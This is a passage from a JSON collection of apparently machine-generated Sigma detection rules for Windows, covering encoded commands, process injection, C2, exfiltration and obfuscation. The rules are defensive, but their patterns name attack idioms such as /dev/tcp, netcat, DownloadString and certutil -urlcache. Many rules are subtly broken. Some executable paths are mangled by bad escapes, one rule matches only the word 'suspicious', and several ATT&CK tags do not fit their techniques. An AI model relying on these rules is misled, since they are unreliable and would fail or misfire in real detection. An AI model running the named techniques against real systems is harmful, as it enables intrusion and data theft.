            "service": "sysmon"
          },
          "detection": {
            "selection_certutil": {
              "Image|endswith": "\\certutil.exe",
              "CommandLine|contains": [
                "-encode",
                "-decode"
              ]
            },
            "selection_powershell_encoded": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "-enc",
                "-EncodedCommand",
                "[Convert]::ToBase64String",
                "Base64"
              ]
            },
            "selection_cmd_base64": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": [
                "base64"
              ]
            },
            "selection_wmic": {
              "Image|endswith": "\\wmic.exe",
              "CommandLine|contains": [
                "base64"
              ]
            },
            "selection_bash": {
              "Image|endswith": "\\bash.exe",
              "CommandLine|contains": [
                "base64"
              ]
            },
            "selection_python": {
              "Image|endswith": [
                "\\python.exe",
                "\\python3.exe"
              ],
              "CommandLine|contains": [
                "base64",
                "b64encode",
                "b64decode"
              ]
            },
            "condition": "selection_certutil or selection_powershell_encoded or selection_cmd_base64 or selection_wmic or selection_bash or selection_python"
          },
          "falsepositives": [
            "Legitimate administrative use of certutil for certificate management",
            "Scripts using base64 encoding for configuration or data serialization in development or automation",
            "PowerShell scripts using -EncodedCommand for legitimate remote execution or task automation"
          ],
          "level": "high",
          "tags": [
            "attack.t1132",
            "attack.t1071",
            "attack.t1010",
            "attack.t1059",
            "attack.c2",
            "detection.encoding",
            "custom.exfiltration"
          ],
          "ttp_id": "unknown",
          "technique_name": "Data Encoding",
          "generation_method": "langchain",
          "id": "61aff9e2-bc89-4104-8d7f-55be61258746"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Process Discovery",
        "status": "success",
        "rule": {
          "title": "Process Discovery via Command Line Tools",
          "description": "Detects process discovery activities on Windows systems using command line tools. Adversaries may use built-in command-line interfaces to gather information about running processes for situational awareness or to assist in execution, persistence, or lateral movement.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_tasklist": {
              "Image|endswith": "\\tasklist.exe"
            },
            "selection_wmic_process": {
              "Image|endswith": "\\wmic.exe",
              "CommandLine|contains": "process"
            },
            "selection_ps_getprocess": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "Get-Process",
                "ps",
                "tasklist",
                "gwmi Win32_Process"
              ]
            },
            "selection_systeminfo": {
              "Image|endswith": "\\systeminfo.exe"
            },
            "selection_netstat": {
              "Image|endswith": "\\netstat.exe",
              "CommandLine|contains": [
                "-ano",
                "/ano"
              ]
            },
            "condition": "selection_tasklist or selection_wmic_process or selection_ps_getprocess or selection_systeminfo or selection_netstat"
          },
          "falsepositives": [
            "Legitimate administrative activity using tasklist, wmic, systeminfo, netstat, or PowerShell Get-Process",
            "Scheduled tasks or monitoring scripts that enumerate running processes",
            "Endpoint detection and response (EDR) tools querying system process state"
          ],
          "level": "medium",
          "tags": [
            "attack.discovery",
            "attack.t1057",
            "attack.t1087",
            "attack.t1063",
            "attack.t1018",
            "detection.emulation",
            "windows.sysmon"
          ],
          "ttp_id": "unknown",
          "technique_name": "Process Discovery",
          "generation_method": "langchain",
          "id": "ed88ae9f-ab61-4f41-81ea-d90649f8081a"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Process Injection",
        "status": "success",
        "rule": {
          "title": "Detected Process Injection Activity via Suspicious Process Creation and Command Line Patterns",
          "description": "Detects potential process injection activity by identifying suspicious parent-child process relationships and command line arguments commonly associated with code injection techniques, such as reflective loading or DLL injection using Windows native tools.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_suspicious_parent": {
              "ParentImage|endswith": [
                "\\lsass.exe",
                "\\svchost.exe",
                "\\winlogon.exe",
                "\\csrss.exe",
                "\\services.exe"
              ],
              "Image|endswith": [
                "\rundll32.exe",
                "\regsvr32.exe",
                "\\mshta.exe",
                "\\certutil.exe",
                "\\cmstp.exe",
                "\\wscript.exe",
                "\\cscript.exe"
              ]
            },
            "selection_injection_patterns": {
              "CommandLine|contains": [
                "-enc",
                "Base64",
                "Reflective",
                "AmsiUtils",
                "/i",
                "CallRemoteFunction",
                "LoadLibrary",
                "WriteProcessMemory",
                "CreateRemoteThread",
                "VirtualAllocEx"
              ]
            },
            "selection_suspicious_child": {
              "ParentImage|endswith": [
                "\\explorer.exe",
                "\taskhostw.exe",
                "\\dllhost.exe"
              ],
              "Image|endswith": [
                "\\powershell.exe",
                "\\cmd.exe",
                "\\wscript.exe",
                "\\cscript.exe"
              ],
              "CommandLine|contains": [
                "\\\\",
                "http",
                "iex",
                "Invoke-Expression",
                "Net.WebClient",
                "DownloadString",
                "Shellcode"
              ]
            },
            "condition": "selection_suspicious_parent or selection_injection_patterns or selection_suspicious_child"
          },
          "falsepositives": [
            "Legitimate administrative scripts using rundll32 or regsvr32 for COM registration",
            "Software deployment tools executing commands via trusted Windows utilities",
            "Internal monitoring agents spawning child processes from system services"
          ],
          "level": "high",
          "tags": [
            "attack.defense-evasion",
            "attack.t1055",
            "detection.rule.sigma",
            "windows.security",
            "process.injection"
          ],
          "ttp_id": "unknown",
          "technique_name": "Process Injection",
          "generation_method": "langchain",
          "id": "e6532b59-0483-4551-8d72-b2a808e1165a"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Application Layer Protocol",
        "status": "success",
        "rule": {
          "title": "Application Layer Protocol Activity via Command Line Tools",
          "description": "Detects potential command and control activity using application layer protocols by identifying suspicious command-line patterns associated with data exfiltration or C2 communication",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_cmd": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": [
                "/c",
                "start",
                "echo",
                ">",
                ">>"
              ]
            },
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "Invoke-WebRequest",
                "-enc",
                "Out-File",
                "System.Net.WebClient",
                "Invoke-RestMethod",
                "-o",
                "-OutFile"
              ]
            },
            "selection_certutil": {
              "Image|endswith": "\\certutil.exe",
              "CommandLine|contains": [
                "-decode",
                "-encode",
                "-urlcache",
                "-f"
              ]
            },
            "selection_bitsadmin": {
              "Image|endswith": "\\bitsadmin.exe",
              "CommandLine|contains": [
                "/transfer",
                "http",
                "https"
              ]
            },
            "selection_curl_wget": {
              "Image|endswith": [
                "\\curl.exe",
                "\\wget.exe"
              ],
              "CommandLine|contains": [
                "http",
                "https",
                "-O",
                "--output"
              ]
            },
            "condition": "selection_cmd or selection_powershell or selection_certutil or selection_bitsadmin or selection_curl_wget"
          },
          "falsepositives": [
            "Legitimate administrative scripts using command-line tools for file download or transfer",
            "Software deployment or patch management using BITSAdmin or certutil",
            "PowerShell scripts using web requests for API calls in monitoring tools"
          ],
          "level": "high",
          "tags": [
            "attack.t1071",
            "attack.command-and-control",
            "detection.signature",
            "custom.windows",
            "custom.exfiltration"
          ],
          "ttp_id": "unknown",
          "technique_name": "Application Layer Protocol",
          "generation_method": "langchain",
          "id": "c5c16565-c303-4c95-ae00-c232294c1ae9"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "status": "success",
        "rule": {
          "title": "Command and Scripting Interpreter via cmd.exe",
          "description": "Detects execution of cmd.exe which may indicate use of command and scripting interpreter for execution. Focuses on common command-line patterns associated with malicious activity.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_cmd": {
              "Image|endswith": "\\cmd.exe"
            },
            "selection_cli_args": {
              "CommandLine|contains": [
                "/c",
                "/k",
                "start",
                "echo",
                ">",
                ">>",
                "<",
                "|",
                "&",
                "&&",
                "||"
              ]
            },
            "condition": "selection_cmd and selection_cli_args"
          },
          "falsepositives": [
            "Legitimate administrative scripts or batch files executing via cmd.exe",
            "Software installers that invoke command-line utilities",
            "User-initiated command-line operations for troubleshooting"
          ],
          "level": "high",
          "tags": [
            "attack.execution",
            "attack.T1059",
            "custom.windows",
            "custom.cmd",
            "custom.command_interpreter"
          ],
          "ttp_id": "unknown",
          "technique_name": "Command and Scripting Interpreter",
          "generation_method": "langchain",
          "id": "784b16d8-4a76-41c8-8f64-470e4781a270"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "status": "success",
        "rule": {
          "title": "Command and Scripting Interpreter Activity via Behavioral Patterns",
          "description": "Detected Command and Scripting Interpreter activity using behavioral command-line patterns commonly associated with execution. Covers multiple interpreter types including PowerShell, cmd, and scripting tools with specific command-line indicators.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_powershell_encoded": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "-enc",
                "-encodedcommand",
                "-e ",
                "-exec bypass",
                "IEX",
                "Invoke-Expression",
                "DownloadString",
                "WebClient",
                "-WindowStyle hidden",
                "-NoProfile",
                "-NonInteractive"
              ]
            },
            "selection_cmd_patterns": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": [
                "/c",
                "start",
                "echo",
                ">",
                ">>",
                "certutil",
                "bitsadmin",
                "nslookup",
                "ping",
                "whoami",
                "net user",
                "net localgroup",
                "reg query",
                "wmic",
                "for /f",
                "set "
              ]
            },
            "selection_wscript_cscript": {
              "Image|endswith": [
                "\\wscript.exe",
                "\\cscript.exe"
              ],
              "CommandLine|contains": [
                ".vbs",
                ".js",
                ".jse",
                ".vbe",
                ".wsf"
              ]
            },
            "selection_bash_sh": {
              "Image|endswith": [
                "\\bash",
                "sh"
              ],
              "CommandLine|contains": [
                "/dev/tcp",
                "nc ",
                "netcat",
                "curl ",
                "wget ",
                "python -c",
                "php -r"
              ]
            },
            "selection_python_inline": {
              "Image|endswith": [
                "\\python.exe",
                "\\python3.exe",
                "\\py.exe"
              ],
              "CommandLine|contains": [
                "-c ",
                "import os",
                "import subprocess",
                "exec(",
                "eval("
              ]
            },
            "condition": "selection_powershell_encoded or selection_cmd_patterns or selection_wscript_cscript or selection_bash_sh or selection_python_inline"
          },
          "falsepositives": [
            "Legitimate administrative scripting using PowerShell, cmd, or scripting engines",
            "Software deployment and patch management tools",
            "Scheduled tasks running maintenance scripts",
            "Developer use of command-line interpreters",
            "PowerShell Desired State Configuration (DSC) execution"
          ],
          "level": "high",
          "tags": [
            "attack.execution",
            "attack.t1059",
            "custom.detection-behavioral-anomalies",
            "custom.windows",
            "custom.sysmon"
          ],
          "ttp_id": "unknown",
          "technique_name": "Command and Scripting Interpreter",
          "generation_method": "langchain",
          "id": "97265f44-12ad-4d5d-995f-488db57de516"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Obfuscated Files or Information",
        "status": "success",
        "rule": {
          "title": "Detected Obfuscated Files or Information via Command-Line Obfuscation",
          "description": "Detects use of obfuscated command-line arguments indicative of defense evasion through obfuscation techniques, commonly seen in malicious scripts or payloads. Detection based on patterns such as encoded commands, excessive use of quotes, concatenation, and environment variable substitution.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_powershell_encoded": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "-enc",
                "-e",
                "-encodedcommand"
              ]
            },
            "selection_cmd_obfuscation": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": [
                "%",
                "^",
                "\"\"",
                "&",
                "call",
                "set"
              ]
            },
            "selection_script_host": {
              "Image|endswith": [
                "\\wscript.exe",
                "\\cscript.exe"
              ],
              "CommandLine|contains": [
                "\\",
                "\\.js",
                "\\.vbs",
                "eval",
                "unescape"
              ]
            },
            "selection_bash_shells": {
              "Image|endswith": [
                "\\bash",
                "\\sh"
              ],
              "CommandLine|contains": [
                "-c",
                "eval",
                "base64"
              ]
            },
            "selection_general_obfuscation": {
              "CommandLine|contains": [
                "${",
                "$(",
                "`",
                "\\x",
                "\\u",
                "\"+\""
              ]
            },
            "condition": "selection_powershell_encoded or selection_cmd_obfuscation or selection_script_host or selection_bash_shells or selection_general_obfuscation"
          },
          "falsepositives": [
            "Legitimate administrative scripts using encoded PowerShell commands",
            "Build or deployment automation tools invoking obfuscated commands",
            "Software installers using embedded scripts with environment variables",
            "Developer tools executing dynamically generated command lines"
          ],
          "level": "high",
          "tags": [
            "attack.defense-evasion",
            "attack.T1027",
            "detection.signature",
            "execution.command-line",
            "custom.obfuscation"
          ],
          "ttp_id": "unknown",
          "technique_name": "Obfuscated Files or Information",
          "generation_method": "langchain",
          "id": "a14fd223-3402-45db-9191-99d672405de1"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Exfiltration Over C2 Channel",
        "status": "success",
        "rule": {
          "title": "Exfiltration Over C2 Channel via Common Tools and Techniques",
          "description": "Detected Exfiltration Over C2 Channel activity via NLP pattern matching and behavioral indicators involving common command-line tools used for data exfiltration.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_powershell_web": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "Invoke-WebRequest",
                "Invoke-RestMethod",
                "-Uri",
                "-OutFile",
                "System.Net.WebClient",
                "DownloadFile",
                "UploadString",
                "-EncodedCommand"
              ]
            },
            "selection_certutil": {
              "Image|endswith": "\\certutil.exe",
              "CommandLine|contains": [
                "-encode",
                "-decode",
                "-urlcache",
                "-f"
              ]
            },
            "selection_bitsadmin": {
              "Image|endswith": "\\bitsadmin.exe",
              "CommandLine|contains": [
                "/transfer",
                "http",
                "https",
                "/priority",
                "NORMAL"
              ]
            },
            "selection_cmd_redir": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": [
                "/c",
                "start",
                "echo",
                ">",
                ">>",
                "copy",
                "type",
                "net use"
              ]
            },
            "selection_compress": {
              "CommandLine|contains": [
                "Compress-Archive",
                "7z a",
                "zip",
                "tar -czf"
              ],
              "Image|endswith": [
                "\\powershell.exe",
                "\\wscript.exe",
                "\\cscript.exe"
              ]
            },
            "selection_ftp_tftp": {
              "Image|endswith": [
                "\\ftp.exe",
                "\\tftp.exe"
              ],
              "CommandLine|contains": [
                "put",
                "get",
                "open"
              ]
            },
            "condition": "selection_powershell_web or selection_certutil or selection_bitsadmin or selection_cmd_redir or selection_compress or selection_ftp_tftp"
          },
          "falsepositives": [
            "Legitimate administrative use of certutil, bitsadmin, or PowerShell for software installation or updates",
            "Scheduled tasks using command-line tools for backup or file transfer",
            "Automated scripts performing authorized data transfers",
            "Development or testing activities involving local web requests or encoding"
          ],
          "level": "high",
          "tags": [
            "attack.exfiltration",
            "attack.T1041",
            "detection.emerging",
            "use-case.exfiltration",
            "custom.windows",
            "custom.sysmon"
          ],
          "ttp_id": "unknown",
          "technique_name": "Exfiltration Over C2 Channel",
          "generation_method": "langchain",
          "id": "3c61cd6d-1154-4718-accc-89e3195a1288"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Archive Collected Data",
        "status": "success",
        "rule": {
          "title": "Archive Collected Data via Common Archiving Tools and Techniques",
          "description": "Detects archiving of collected data using common tools and command-line utilities such as PowerShell Compress-Archive, 7-Zip, WinRAR, and other archive utilities often used in data staging prior to exfiltration.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "Compress-Archive",
                "7z a",
                "rar a",
                "tar -cf",
                "zip -r"
              ]
            },
            "selection_cmd": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": [
                "7z a",
                "rar a",
                "tar -cf",
                "zip -r",
                "makecab"
              ]
            },
            "selection_7zip": {
              "Image|endswith": "\\7z.exe",
              "CommandLine|contains": "a"
            },
            "selection_rar": {
              "Image|endswith": "\\rar.exe",
              "CommandLine|contains": "a"
            },
            "selection_tar": {
              "Image|endswith": "\\tar.exe",
              "CommandLine|contains": "-cf"
            },
            "selection_zip": {
              "Image|endswith": "\\zip.exe",
              "CommandLine|contains": "-r"
            },
            "selection_makecab": {
              "Image|endswith": "\\makecab.exe",
              "CommandLine|contains": [
                "/f",
                "/d Compress"
              ]
            },
            "condition": "selection_powershell or selection_cmd or selection_7zip or selection_rar or selection_tar or selection_zip or selection_makecab"
          },
          "falsepositives": [
            "Legitimate administrative use of archiving tools for backup or packaging",
            "Automated software deployment scripts using compression",
            "User-initiated file compression via command line or scripts"
          ],
          "level": "high",
          "tags": [
            "attack.collection",
            "attack.T1560",
            "detection.emerging",
            "use-case.data_staging"
          ],
          "ttp_id": "unknown",
          "technique_name": "Archive Collected Data",
          "generation_method": "langchain",
          "id": "2f95eda2-56e8-4bfe-9ad8-59c4e8427e17"
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "User Execution: Malicious File",
        "status": "success",
        "rule": {
          "title": "User Execution of Malicious File via Suspicious Process Creation",
          "description": "Detects user execution of malicious files by identifying suspicious process creation patterns commonly associated with initial execution from phishing or malicious documents. Focuses on Office applications spawning command-line tools or scripts, which is uncommon in normal user activity.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "CommandLine|contains": "suspicious"
            },
            "condition": "selection"
          },
          "falsepositives": [
            "Legitimate administrative scripts initiated by users after opening Office documents (rare)",
            "Enterprise software installers launched from document templates (uncommon)",
            "User training or red team exercises"
          ],
          "level": "high",
          "tags": [
            "attack.execution",
            "attack.t1204.002",
            "attack.t1059",
            "attack.t1204",
            "detection.rule.suspicious_process_chain"
          ],
          "ttp_id": "unknown",
          "technique_name": "User Execution: Malicious File",
          "generation_method": "langchain",
          "id": "ef8c18c5-c12f-48fe-bf5c-ce78964627d0"
        },
        "generation_method": "langchain"
      }
    ],
    "rules": [
      {
        "title": "Remote Template Injection via Office Documents",
        "description": "Detects remote template injection via Office documents",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_winword": {
            "Image|endswith": "\\WINWORD.EXE"
          },
          "selection_powershell": {
            "ParentImage|endswith": "\\WINWORD.EXE",
            "Image|endswith": "\\powershell.exe"
          },
          "selection_cmd": {
            "ParentImage|endswith": "\\WINWORD.EXE",
            "Image|endswith": "\\cmd.exe"
          },
          "condition": "selection_powershell or selection_cmd"
        },
        "falsepositives": [
          "Legitimate Office document editing",
          "PowerShell or command prompt usage for administrative tasks"
        ],
        "level": "high",
        "tags": [
          "attack.initial_access",
          "attack.t1566",
          "custom.remote_template_injection"
        ],
        "ttp_id": "unknown",
        "technique_name": "Remote Template Injection",
        "generation_method": "langchain",
        "id": "eb97eb4a-1bbb-45d7-96bd-b88aef560f4f"
      },
      {
        "title": "Command and Scripting Interpreter",
        "description": "Threat actor used command line tools like at, cmd, net, ping, reg for execution",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_at": {
            "Image|endswith": "\u0007t.exe"
          },
          "selection_cmd": {
            "Image|endswith": "\\cmd.exe"
          },
          "selection_net": {
            "Image|endswith": "\net.exe"
          },
          "selection_ping": {
            "Image|endswith": "\\ping.exe"
          },
          "selection_reg": {
            "Image|endswith": "\reg.exe"
          },
          "condition": "selection_at or selection_cmd or selection_net or selection_ping or selection_reg"
        },
        "falsepositives": [
          "Administrative tasks",
          "System maintenance scripts"
        ],
        "level": "medium",
        "tags": [
          "attack.execution",
          "attack.t1569",
          "custom.mitre_command_and_scripting_interpreter"
        ],
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "generation_method": "langchain",
        "id": "73fe830d-54bd-4784-a370-d3c166299243"
      },
      {
        "title": "Phishing Detection via Office Process Spawning Command Shells",
        "description": "Detects potential phishing activity by identifying Office processes spawning command shells",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "ParentImage|endswith": [
              "\\WINWORD.EXE",
              "\\EXCEL.EXE",
              "\\POWERPNT.EXE"
            ],
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe"
            ]
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate office automation scripts",
          "Administrative tasks involving office applications"
        ],
        "level": "medium",
        "tags": [
          "attack.initial_access",
          "attack.t1566",
          "custom.phishing"
        ],
        "ttp_id": "unknown",
        "technique_name": "Phishing",
        "generation_method": "langchain",
        "id": "f1f8f8f5-fb91-4e48-8c59-40caffbeb91a"
      },
      {
        "title": "Obfuscated Files or Information Detection",
        "description": "Detects the use of anti-disassembly techniques, API hashing, and custom encoding to make analysis harder",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_api_hashing": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "GetCursorPos()",
              "GetTickCount()"
            ]
          },
          "selection_custom_encoding": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": [
              "C:\\Users\\user\\AppData\\Local\\Temp\\[redacted].zip"
            ]
          },
          "condition": "selection_api_hashing or selection_custom_encoding"
        },
        "falsepositives": [
          "Legitimate use of powershell for system administration",
          "Use of cmd.exe for batch scripting"
        ],
        "level": "high",
        "tags": [
          "attack.defense_evasion",
          "attack.t1564.001",
          "custom.mitre_obfuscated_files_or_information"
        ],
        "ttp_id": "unknown",
        "technique_name": "Obfuscated Files or Information",
        "generation_method": "langchain",
        "id": "4d8123db-00a6-4001-99e9-e161b3c92c9a"
      },
      {
        "title": "Process Hollowing via cmd.exe",
        "description": "Detects the creation of a reverse shell by executing cmd.exe in a stealthy way",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_cmd": {
            "Image|endswith": "\\cmd.exe",
            "ParentImage|endswith": "\\svchost.exe"
          },
          "selection_createprocess": {
            "Image|endswith": "\\svchost.exe",
            "CommandLine|contains": [
              "CreateProcessW",
              "CreatePipe"
            ]
          },
          "condition": "selection_cmd and selection_createprocess"
        },
        "falsepositives": [
          "Legitimate system administration tasks",
          "Software installations"
        ],
        "level": "high",
        "tags": [
          "attack.defense_evasion",
          "attack.t1566",
          "mitre.process_hollowing"
        ],
        "ttp_id": "unknown",
        "technique_name": "Process Hollowing",
        "generation_method": "langchain",
        "id": "580f86be-bffb-453b-9b7d-a6643af2ad54"
      },
      {
        "title": "Obfuscated Files or Information Detection",
        "description": "Detects the use of obfuscated files or information as part of the Defense Evasion tactic",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_obfuscated_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "-enc",
              "-encod",
              "-encoded",
              "-encoding",
              "-encodings"
            ]
          },
          "selection_obfuscated_cmd": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": [
              "/c",
              "start",
              "echo",
              ">>",
              ">"
            ]
          },
          "selection_obfuscated_certutil": {
            "Image|endswith": "\\certutil.exe",
            "CommandLine|contains": [
              "-decode",
              "-encode",
              "-urlcache"
            ]
          },
          "condition": "selection_obfuscated_powershell or selection_obfuscated_cmd or selection_obfuscated_certutil"
        },
        "falsepositives": [
          "Legitimate use of PowerShell for automation",
          "Use of cmd.exe for system administration",
          "Certutil usage for certificate management"
        ],
        "level": "medium",
        "tags": [
          "attack.defense_evasion",
          "attack.t1564.001",
          "custom.obfuscated_files_or_information"
        ],
        "ttp_id": "unknown",
        "technique_name": "Obfuscated Files or Information",
        "generation_method": "langchain",
        "id": "659a7e12-03ca-4193-a4b1-5d83c50bd7b2"
      },
      {
        "title": "Exfiltration Over Alternative Protocol",
        "description": "Detects potential exfiltration of data over alternative protocols",
        "logsource": {
          "category": "network_connection",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "DestinationIp": "redacted[.]redacted[.]com",
            "DestinationPort": 443
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate connections to the specified domain for software updates or other authorized purposes"
        ],
        "level": "high",
        "tags": [
          "attack.exfiltration",
          "attack.t1567",
          "exfiltration.over.alternative.protocol"
        ],
        "ttp_id": "unknown",
        "technique_name": "Exfiltration Over Alternative Protocol",
        "generation_method": "langchain",
        "id": "2d788940-4f44-4698-8c59-e44cc7dcdfbf"
      },
      {
        "title": "Spearphishing Attachment via Office Document",
        "description": "Detects spear-phishing attacks using Office documents to deliver malicious payloads",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection1": {
            "ParentImage|endswith": "\\WINWORD.EXE",
            "Image|endswith": "\\cmd.exe"
          },
          "selection2": {
            "ParentImage|endswith": "\\WINWORD.EXE",
            "Image|endswith": "\\powershell.exe"
          },
          "condition": "selection1 or selection2"
        },
        "falsepositives": [
          "Legitimate Office document editing",
          "Software installation or updates"
        ],
        "level": "high",
        "tags": [
          "attack.initial_access",
          "attack.t1566",
          "attack.spearphishing_attachment"
        ],
        "ttp_id": "unknown",
        "technique_name": "Spearphishing Attachment",
        "generation_method": "langchain",
        "id": "6449b3d3-796c-4762-8711-e01487acf989"
      },
      {
        "title": "File and Directory Discovery via API Calls",
        "description": "Detects the use of API calls to discover files and directories on a system",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_api_calls": {
            "Image|endswith": [
              "\\explorer.exe",
              "\\cmd.exe"
            ],
            "CommandLine|contains": [
              "GetLogicalDeviceStringsW",
              "FindFirstFileA",
              "FindNextFileA"
            ]
          },
          "condition": "selection_api_calls"
        },
        "falsepositives": [
          "Legitimate system administration tasks",
          "Software installation processes"
        ],
        "level": "medium",
        "tags": [
          "attack.discovery",
          "attack.t1567",
          "custom.sigma"
        ],
        "ttp_id": "unknown",
        "technique_name": "File and Directory Discovery",
        "generation_method": "langchain",
        "id": "de8c2dff-0c1c-42e8-ade9-e2967f1c2775"
      },
      {
        "title": "System Information Discovery via Directory Listing",
        "description": "Detects system information discovery via directory listing",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_dir": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": [
              "dir",
              "ls"
            ]
          },
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "Get-ChildItem",
              "ls"
            ]
          },
          "condition": "selection_dir or selection_powershell"
        },
        "falsepositives": [
          "Legitimate system administration tasks",
          "Scripted directory listings for backup or automation purposes"
        ],
        "level": "medium",
        "tags": [
          "attack.discovery",
          "attack.t1565",
          "custom.sigma"
        ],
        "ttp_id": "unknown",
        "technique_name": "System Information Discovery",
        "generation_method": "langchain",
        "id": "7bb6cebe-efb6-436e-938e-83c70c4245da"
      },
      {
        "title": "Execution of VBA Macro Code",
        "description": "Detects the execution of VBA macro code, which can be used to deliver the next stage to the final payload execution",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_office": {
            "Image|endswith": [
              "\\WINWORD.EXE",
              "\\EXCEL.EXE",
              "\\POWERPNT.EXE"
            ]
          },
          "selection_macro": {
            "ParentImage|endswith": [
              "\\WINWORD.EXE",
              "\\EXCEL.EXE",
              "\\POWERPNT.EXE"
            ],
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe"
            ]
          },
          "condition": "selection_office and selection_macro"
        },
        "falsepositives": [
          "Legitimate Office macro execution",
          "Administrative tasks using Office applications"
        ],
        "level": "high",
        "tags": [
          "attack.t1204",
          "attack.execution"
        ],
        "ttp_id": "unknown",
        "technique_name": "Execution of VBA Macro Code",
        "generation_method": "langchain",
        "id": "bc4fc587-d3b5-4009-8195-1d64ea485b80"
      },
      {
        "title": "System Information Discovery via API Calls",
        "description": "Detects system information discovery using GetUserNameA(), GetComputerNameA(), and GetModuleFileNameA() API calls",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_getusername": {
            "Image|endswith": "\\svchost.exe",
            "CommandLine|contains": "GetUserNameA"
          },
          "selection_getcomputername": {
            "Image|endswith": "\\svchost.exe",
            "CommandLine|contains": "GetComputerNameA"
          },
          "selection_getmodulefilename": {
            "Image|endswith": "\\svchost.exe",
            "CommandLine|contains": "GetModuleFileNameA"
          },
          "condition": "selection_getusername or selection_getcomputername or selection_getmodulefilename"
        },
        "falsepositives": [
          "Legitimate system monitoring tools",
          "Administrative scripts"
        ],
        "level": "medium",
        "tags": [
          "attack.discovery",
          "attack.t1565",
          "custom.sigma"
        ],
        "ttp_id": "unknown",
        "technique_name": "System Information Discovery",
        "generation_method": "langchain",
        "id": "7ffee057-da87-4130-9978-72eefac95747"
      },
      {
        "title": "Obfuscated Files or Information",
        "description": "Detects the use of obfuscation to hide files or information",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_obfuscation": {
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe"
            ],
            "CommandLine|contains": [
              "-enc",
              "-dec",
              "-encod",
              "-decode",
              "base64"
            ]
          },
          "selection_suspicious_activity": {
            "Image|endswith": [
              "\\certutil.exe"
            ],
            "CommandLine|contains": [
              "-encode",
              "-decode"
            ]
          },
          "condition": "selection_obfuscation or selection_suspicious_activity"
        },
        "falsepositives": [
          "Legitimate use of encoding/decoding tools",
          "Compression software"
        ],
        "level": "medium",
        "tags": [
          "attack.defense_evasion",
          "attack.t1564.001",
          "custom.obfuscated_files_or_information"
        ],
